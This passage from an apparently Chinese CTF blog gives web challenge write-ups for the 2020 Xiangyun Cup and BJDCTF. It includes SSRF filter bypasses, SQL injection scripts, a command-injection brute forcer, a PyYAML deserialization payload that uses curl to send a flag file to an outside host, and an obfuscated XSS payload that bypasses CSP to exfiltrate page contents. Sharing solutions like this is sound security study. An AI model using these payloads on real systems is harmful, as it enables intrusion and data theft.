        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}

//Route:/index || /
func index(w http.ResponseWriter, r *http.Request) {
    t, _ := template.ParseFiles(&quot;index.gtpl&quot;)
    t.Execute(w,nil)
    return
}

//Route:/login
func login(w http.ResponseWriter, r *http.Request) {
    if r.Method==&quot;POST&quot;{
        r.ParseForm()
        if r.Form[&quot;username&quot;]==nil &amp;&amp; r.Form[&quot;password&quot;]==nil{
            fmt.Fprint(w,&quot;username and password is required&quot;)
            return
        }
        User:=Users{
            Username: r.Form[&quot;username&quot;][0],
            Password: r.Form[&quot;password&quot;][0],
        }
        setCookie(w,r,cookieEncode(serialize(User)))
        fmt.Fprint(w,&quot;&lt;script&gt;window.location.href=&#39;/home&#39;&lt;/script&gt;&quot;)
    }else{
        fmt.Fprint(w,&quot;Method not allowed&quot;)
        return
    }
}
func home(w http.ResponseWriter,r *http.Request){
    if getCookie(r)!=nil {
        t, _ := template.ParseFiles(&quot;home.gtpl&quot;)
        t.Execute(w, nil)
    }else{
        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}

//Route:/show
func show(w http.ResponseWriter, r *http.Request) {
    if getCookie(r)!=nil {
        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
        file:=UserData.Filename
        sign:=UserData.Sign
        ff, err := os.Open(file)
        defer ff.Close()
        if err!=nil{
            fmt.Println(err)
            t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
            t.Execute(w, template.HTML(&quot;？？？？？&quot;))
            return
        }
        fmt.Println(sign)
        if sign!=Md5(file+salt){
            fmt.Fprint(w,&quot;签名失败&quot;)
            return
        }
        sourcebuffer := make([]byte, 500000)
        n, _ := ff.Read(sourcebuffer)
        filedata := base64.StdEncoding.EncodeToString(sourcebuffer[:n])
        fmt.Println(filedata)
        t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
        t.Execute(w, template.HTML(&quot;&lt;img src=&#39;data:image/jpeg;base64,&quot;+filedata+&quot;&#39;&gt;&quot;))
    }else{
        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}</code></pre>
<p>这样应该是非预期把？</p>
<h2 id="doyouknowssrf"><a href="#doyouknowssrf" class="headerlink" title="doyouknowssrf"></a>doyouknowssrf</h2><pre><code class="php">&lt;?php
// ini_set(&quot;display_errors&quot;, &quot;On&quot;);
// error_reporting(E_ALL | E_STRICT);


function safe_url($url,$safe) {
    $parsed = parse_url($url);
    $validate_ip = true;
    if($parsed[&#39;port&#39;]  &amp;&amp; !in_array($parsed[&#39;port&#39;],array(&#39;80&#39;,&#39;443&#39;))){

        echo &quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;.PHP_EOL;

        return false;
    }else{
        preg_match(&#39;/^\d+$/&#39;, $parsed[&#39;host&#39;]) &amp;&amp; $parsed[&#39;host&#39;] = long2ip($parsed[&#39;host&#39;]);
        $long = ip2long($parsed[&#39;host&#39;]);
        if($long===false){
            $ip = null;
            if($safe){
                @putenv(&#39;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#39;);
                $ip   = gethostbyname($parsed[&#39;host&#39;]);
                $long = ip2long($ip);
                $long===false &amp;&amp; $ip = null;
                @putenv(&#39;RES_OPTIONS&#39;);
            }
        }else{
            $ip = $parsed[&#39;host&#39;];
        }
        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
    }

    if(!in_array($parsed[&#39;scheme&#39;],array(&#39;http&#39;,&#39;https&#39;)) || !$validate_ip){
        echo &quot;&lt;b&gt;{$url} 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;.PHP_EOL;

        return false;
    }else{
        return $url;
    }
}


function curl($url){
    $safe = false;
    if(safe_url($url,$safe)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $co = curl_exec($ch);
        curl_close($ch);
        echo $co;
    }
}

highlight_file(__FILE__);
curl($_GET[&#39;url&#39;]);
</code></pre>
<p>emmm，这题是原题。<a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/" target="_blank" rel="noopener">https://tyaoo.github.io/2020/08/31/2020-GACTF-web/</a> ,我是后来才知道的。。。。</p>
<p>绕过端口限制的方法一种是：<code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code></p>
<p>还有一个是：<code>http:/ctf.ccreater.top:5000/</code></p>
<p><code>var_dump(parse_url)</code></p>
<pre><code>array(2) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;path&#39; =&gt;
  string(23) &quot;/ctf.ccreater.top:5000/&quot;
}</code></pre><p>然后curl去访问是正常的</p>
<p>接下来按着那个wp走发现flask,继续ssrf，发现redis，原本是wp里面的redis主从复制RCE直接打这题的，但是试了好久都没成功，明明有向我发送数据</p>
<p>redis ssrf还有一种RCE方法是写文件，这一题就是这么干的，因为那个wp我一直没往这方面想</p>
<p>然后去看了写redis发现它的版本是2.x主从复制RCE的那个exp是针对3.x和4.x  ：(</p>
<h2 id="easyzzz"><a href="#easyzzz" class="headerlink" title="easyzzz"></a>easyzzz</h2><p>百度一波网上的cve解出这题</p>
<p>简单说下过程</p>
<p>/plugins/webuploader/js/webconfig.php</p>
<p>拿到后台地址  admin539/</p>
<p><a href="https://xz.aliyun.com/t/7414" target="_blank" rel="noopener">https://xz.aliyun.com/t/7414</a> ，利用前台sql注入修改管理员密码</p>
<p>搭个转发的方便测试</p>
<pre><code class="python">import requests
from flask import Flask,request
app = Flask(__name__)


def access(exp):
    burp0_url = &quot;http://eci-2ze9cofh8j38ebxctduq.cloudeci1.ichunqiu.com:80/plugins/sms/sms_list.php?act=del&quot;
    burp0_cookies = {&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1604567758,1604568322,1604568358,1605921830&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1606016268&quot;, &quot;PHPSESSID&quot;: &quot;3fe85864bb4ad1dc9f25e5271281baf9&quot;, &quot;__jsluid_h&quot;: &quot;85077cc270ca34654c02f2479fcb9390&quot;, &quot;zzz254_adminpass&quot;: &quot;0&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    burp0_data = {&quot;id[={exp} ;-- ]&quot;.format(exp=exp): &quot;1&quot;}
    return requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

@app.route(&#39;/&#39;)
def hello_world():
    payload = request.args.get(&quot;exp&quot;,&quot;&quot;)
    r=access(payload)
    print(payload)
    return r.text


app.run()</code></pre>
<p>直接访问:</p>
<p><code>http://127.0.0.1:5000/?exp=1;replace INTO zzz_user(uid,u_gid, u_lid, u_onoff, u_order, sex, username, password, question, answer, regtime, truename, face, province, city, district, address, post, tel, mobile, email, qq, u_desc, adminrand, lastlogintime, lastloginip, logincount, sysinfo, points, balance) VALUES (1, 1, 1, 1, 0, &#39;%E7%94%B7&#39;, &#39;admin&#39;, &#39;1ccbbb718e0e9c3a&#39;, &#39;8TBRJ2H5NXW57EVF&#39;, &#39;S8DDQC9YV494G84Q&#39;, &#39;&#39;, &#39;%E5%88%9B%E5%A7%8B%E4%BA%BA&#39;, &#39;face01.png&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;6a79122eab1e8abd10bcabd91ebbc36c&#39;, &#39;2020/11/22 17:25:13&#39;, &#39;127.0.0.1&#39;, 6, &#39;&#39;, 0, 0);--</code></p>
<p>修改admin密码为041676</p>
<p>没有写权限，但是我们只要读到flag就好了，利用这个cms的模板渲染机制，修改模板为我们想读的文件/flag，来拿到flag</p>
<h2 id="profile-system"><a href="#profile-system" class="headerlink" title="profile system"></a>profile system</h2><p>一看就是一个flask(它的cookie)，文件上传可以目录穿越，猜测后端访问uploads路由是这样的：<code>/uploads/&lt;path:path&gt;</code><br>直接读取<code>/uploads/../app.py</code></p>
<p>app.py</p>
<pre><code class="python">from flask import Flask, render_template, request, flash, redirect, send_file,session,render_template_string
import os
import re
from hashlib import md5
import yaml


app = Flask(__name__)
app.config[&#39;UPLOAD_FOLDER&#39;] = os.path.join(os.curdir, &quot;uploads&quot;)
app.config[&#39;SECRET_KEY&#39;] = &#39;Th1s_is_A_Sup333er_s1cret_k1yyyyy&#39;
ALLOWED_EXTENSIONS = {&#39;yaml&#39;,&#39;yml&#39;}

def allowed_file(filename):
    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower()

@app.route(&quot;/&quot;)
def index():
    session[&#39;priviledge&#39;] = &#39;guest&#39;
    return &quot;home&quot;

@app.route(&quot;/upload&quot;, methods=[&quot;POST&quot;])
def upload():
    file = request.files[&quot;file&quot;]
    if file.filename == &#39;&#39;:
        flash(&#39;No selected file&#39;)
        return redirect(&quot;/&quot;)
    elif not (allowed_file(file.filename) in ALLOWED_EXTENSIONS):
        flash(&#39;Please upload yaml/yml only.&#39;)
        return redirect(&quot;/&quot;)
    else:
        dirname = md5(request.remote_addr.encode()).hexdigest()
        filename = file.filename
        session[&#39;filename&#39;] = filename 
        upload_directory = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname)
        if not os.path.exists(upload_directory):
            os.mkdir(upload_directory)
        upload_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname, filename)
        file.save(upload_path)
        return os.path.join(dirname, filename)


@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)
def uploads(path):
    return send_file(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], path))


@app.route(&quot;/view&quot;)
def view():
    dirname = md5(request.remote_addr.encode()).hexdigest()
    realpath = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], dirname,session[&#39;filename&#39;]).replace(&#39;..&#39;,&#39;&#39;)
    if session[&#39;priviledge&#39;] ==&#39;elite&#39; and os.path.isfile(realpath):
        try:
            with open(realpath,&#39;rb&#39;) as f:
                data = f.read()
                if not re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE):
                    info = {&#39;user&#39;: &#39;elite-user&#39;}
                    flash(&#39;Sth weird...&#39;)
                else:
                    info = yaml.load(data)
                if info[&#39;user&#39;] == &#39;Administrator&#39;:
                    flash(&#39;Welcome admin!&#39;)
                else:
                    raise ()
        except :
            info = {&#39;user&#39;: &#39;elite-user&#39;}
    else:
        info = {&#39;user&#39;: &#39;guest&#39;}
    return render_template_string(&quot;{{user}}&quot;,user=info[&#39;user&#39;])
#.,^,_,`,~


if __name__ == &quot;__main__&quot;:
    app.run(&#39;0.0.0.0&#39;,port=8888,threaded=True)
</code></pre>
<p>有了secret我们就可以任意伪造session了</p>
<p>注意到：<code>info = yaml.load(data)</code></p>
<p>直接使用这个会有个提醒</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201122221248.png" alt="image16652"></p>
<p>百度一下为啥不安全，yaml反序列化注入get</p>
<p>直接抄来一个exp</p>
<pre><code class="yaml">!!python/object/new:type
  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:exec }]
  listitems: &quot;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&quot;</code></pre>
<p>看下进入<code>info = yaml.load(data)</code> 的前提</p>
<p><code>re.fullmatch(b&quot;^[ -\-/-\]a-}\n\r]*$&quot;,data, flags=re.MULTILINE)</code></p>
<p>利用<a href="https://regex101.com/" target="_blank" rel="noopener">regex101</a>读懂这个的意思，其实就是禁止出现</p>
<pre><code>.^_`~</code></pre><p>这几个字符</p>
<p>这个payload完美符合所有条件</p>
<p>一定要注意payload不能出现\r</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>python的float类型有两个特殊的值：nan(not a number),inf(infinity,无穷)</p>
<p><strong>php parse_url 小trick</strong></p>
<p><code>var_dump(parse_url(&quot;http:/ctf.ccreater.top:5000/&quot;))</code></p>
<pre><code>array(2) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;path&#39; =&gt;
  string(23) &quot;/ctf.ccreater.top:5000/&quot;
}</code></pre><p><code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code>:<a href="https://bugs.php.net/bug.php?id=77991" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77991</a></p>
<pre><code>var_dump(parse_url(&quot;http://foo@127.0.0.1:6379%20@www.baidu.com&quot;));
php shell code:1:
array(4) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;host&#39; =&gt;
  string(13) &quot;www.baidu.com&quot;
  &#39;user&#39; =&gt;
  string(13) &quot;foo@127.0.0.1&quot;
  &#39;pass&#39; =&gt;
  string(7) &quot;6379%20&quot;
}</code></pre><p>python 中的yaml.load也存在反序列化问题</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020祥云杯web题解/">https://www.ccreater.top/1970/01/01/2020祥云杯web题解/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" data-id="ckmn5754q000ns1ni9jvbe6w3" data-title="2020祥云杯web题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020第三届BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020BJDCTF第三届"><a href="#2020BJDCTF第三届" class="headerlink" title="2020BJDCTF第三届"></a>2020BJDCTF第三届</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><pre><code class="php"># -*-coding:utf-8 -*-
import requests
import re

flag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)
all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;


def get_flag(command):
    try:
        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)
    except:
        return True
    return False


if __name__ == &#39;__main__&#39;:
    flag = &#39;BJD{make_iptables_great_again}&#39;
    while flag_format.match(flag) == None:
        staus = 0
        for i in all_letter:
            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)
            print(payload)
            if get_flag(payload):
                staus = 1
                flag += i
                print(flag)
                break
        if staus == 0:
            flag = flag[0:-1]
</code></pre>
<h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p>
<p>可能存在反序列化</p>
<p>和文件内容无关</p>
<p>上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取</p>
<p>当唯一麻烦的是，文件名后面有个md5校验值</p>
<p>但是当我们直接上传的时候她会生成一个，哪怕没上传成功</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p>
<p>直接拿来用访问show.php就拿到flag了</p>
<h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p>
<p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p>
<p>黑名单:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p>
<p>给了个hint:<code>table</code>,不知道啥意思</p>
<pre><code class="python">
import requests
import time
import string


def sqlinj(num):

    burp0_url = &quot;http://183.129.189.60:10117/&quot;
    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)
    time.sleep(0.5)
    print(param)
    if &quot;/static/img/dundundun.gif&quot; in r.text:
        print(&quot;filter &quot;,param)
        exit()
    if &quot;y1ng&quot; in r.text:

        return False
    else :
        return True




#database: ms
#mysql,sys
#Hint: /Source Password
#table:gtid_executed,sys_config
result=&quot;12,Hint: /Source Password: T1Me&quot;
pos=len(result)*2+2

while True:
    flag=False
    for i in string.printable:
        if sqlinj(ord(i)):
            result+=i
            print(&quot;Found:&quot;+result)
            flag=True
            break
        print(&quot;result:&quot;+result)
    pos+=2
    if flag is False:
        break</code></pre>
<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>flag.php</p>
<pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG
    echo FLAG;
else echo $_SERVER[&#39;REMOTE_ADDR&#39;];
</code></pre>
<p>bot脚本：</p>
<pre><code class="php">
if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check
    $url = $_POST[&#39;url&#39;];
    $captcha = $_POST[&#39;captcha&#39;];
    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {
        //admin checking, it will take several seconds

    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);
}
?&gt;</code></pre>
<pre><code class="php">function checkURL($url) {
    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )
        return false;
    else return true;
}
function checkNote($s) {
    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;
    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;
    else return true;
}</code></pre>
<p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p>
<p>绕过</p>
<pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();
xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre>
<p>拿到flag</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p>
<pre><code>/flag.php
/index.php
/log.php
/login.php
/www.zip</code></pre><p>flag.php</p>
<pre><code class="php">flag.php关键代码如下：
$classname = $_GET[&#39;classname&#39;];
$data = $_GET[&#39;data&#39;];
$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);
Only users from the website can request this page. flag in /flag, have fun!</code></pre>
<p>先登陆康康,需要key,相关代码在:</p>
<pre><code class="php">&lt;?php
    header(&quot;content-type:text/html;charset=utf-8&quot;);
    session_start();
    function getkey()
    {
        $key = &#39;&#39;;
        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);
        for ($i = 0; $i &lt; 48; $i++)
        {
            $key = $key . $chars[random_int(0, 61)];
        }
        $_SESSION[&#39;key&#39;] = $key;
        return $key;
    }
    function getreferer() {
        static $referer;
        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {
                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];
            }
        elseif(isset($_POST[&#39;URL_REFERER&#39;])){
                $referer = $_POST[&#39;URL_REFERER&#39;];
            }
        else{
            die(&quot;Where are you from?&quot;);
        }
        return $referer;
    }
        $key = getkey();
        $url = getreferer();
        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){
            die(&quot;What do you want to do?&quot;);
        }
        $host = parse_url($url, PHP_URL_HOST);
        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){
            $headers = get_headers($url,1);
            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){
                echo $key;
            }
            else{
                echo &#39;dd beheading!&#39;;
            }
        }
        else{
            die(&quot;Only dd working at Google can get the key!&quot;);
        }</code></pre>
<h2 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p>
<p>User.php</p>
<pre><code class="php">&lt;?php
if ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)
    highlight_file(__FILE__);

/**
 * @Entity
 * @Table(name=&quot;user&quot;)
 */
class User
{
    /** 
     * @Id
     * @Column(type=&quot;integer&quot;)
     * @GeneratedValue
     */
    protected $uid;
    /** 
     * @Column(type=&quot;string&quot;) 
     * @unique
     */
    protected $username;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $password;
    /** 
     * @Column(type=&quot;string&quot;) 
     */
    protected $role;

    public function __get($name)
    {
        if (property_exists(__CLASS__, $name)) {
            return $this-&gt;$name;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
    public function __set($name, $value)
    {
        if (property_exists(__CLASS__, $name)) {
            $this-&gt;$name = $value;
        } else {
            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);
        }
    }
}</code></pre>
<h2 id="布吉岛"><a href="#布吉岛" class="headerlink" title="布吉岛"></a>布吉岛</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p>
<p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/2020第三届BJDCTF/">https://www.ccreater.top/1970/01/01/2020第三届BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="ckmn5754s000qs1nida061pco" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-3月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php

$function = @$_GET[&#39;f&#39;];

function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;

extract($_POST);

if(!$function){
